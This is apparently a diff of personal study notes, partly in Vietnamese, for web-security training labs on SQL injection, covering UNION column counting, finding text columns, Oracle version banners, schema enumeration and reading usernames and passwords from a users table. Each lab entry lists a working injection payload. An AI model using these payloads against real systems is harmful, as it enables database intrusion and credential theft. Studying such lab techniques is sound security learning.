@@ -1,8 +1,9 @@
-____________________________________________________________
-|  LƯU Ý :                                                 |  
-|  + có thể THAY 'abc'  -> null NẾU GẶP server error       |
-|  + phải cẩn trọng với các mẫu viết hoa của các câu lệnh  |
-|__________________________________________________________|
+____________________________________________________________________________________________________________________________________________________________________
+|  LƯU Ý :                                                                                                                                       
+|  + có thể THAY 'abc'  -> null NẾU GẶP server error                                                                                             
+|  + phải cẩn trọng với các mẫu viết hoa của các câu lệnh                                                                                      
+|  + kiểm tra kiểu data mà các cột của bảng có thể hiển thị (tránh trường hợp kiểu data của output không trùng với kiểu data mà các cột của bảng có thể hiển thị => |    không thể in được kết quả của payloads)  
+|___________________________________________________________________________________________________________________________________________________________________
 
 
 Lab: SQL injection UNION attack, determining the number of columns returned by the query ( non - Orancle )
@@ -21,6 +22,17 @@ Lab: SQL injection attack, querying the database type and version ( on - Oracle)
     + exploit :
       ' UNION SELECT 'abc',banner FROM v$version --
 
+
+Lab: SQL injection UNION attack, finding a column containing text
+  target : tìm xem kiểu dữ liệu có thể xuất ra màn hình của các cột trong bảng của web
+  payload : (vd test thay string vào từng vị trí trong payload , nếu cái nào k gây ra lỗi thì tại cái vị trí đó có thể chứa data kiểu string và làm tương tự với các kiểu data khác)
+    ' UNION SELECT NULL , 'zUgbJ9' , NULL --
+
+Lab: SQL injection UNION attack, retrieving multiple values in a single column
+  target : same lab trên và phải lấy kết quả từ bảng có sẵn in ra cột phù hợp
+  payloads : ' union select null, username||'--'||password from users--
+
+
 Lab: SQL injection attack, listing the database contents on Oracle
   target : lấy data từ sql của web
     + explot : < trong payloads all the things>
@@ -36,10 +48,10 @@ Lab: SQL injection attack, listing the database contents on non-Oracle databases
       ' union SELECT column_name , null FROM information_schema.columns WHERE table_name='' --
 
 
-Lab: SQL injection UNION attack, finding a column containing text
-  target : tìm xem kiểu dữ liệu có thể xuất ra màn hình của các cột trong bảng của web
-  payload : (vd test thay string vào từng vị trí trong payload , nếu cái nào k gây ra lỗi thì tại cái vị trí đó có thể chứa data kiểu string và làm tương tự với các kiểu data khác)
-    ' UNION SELECT NULL , 'zUgbJ9' , NULL --
+Lab: SQL injection UNION attack, retrieving data from other tables
+  target : cho sẵn bảng users với tên các cột , chỉ việc union kết nối đến đó
+  payloads : ' union select username,password from users --
+
 
 
 
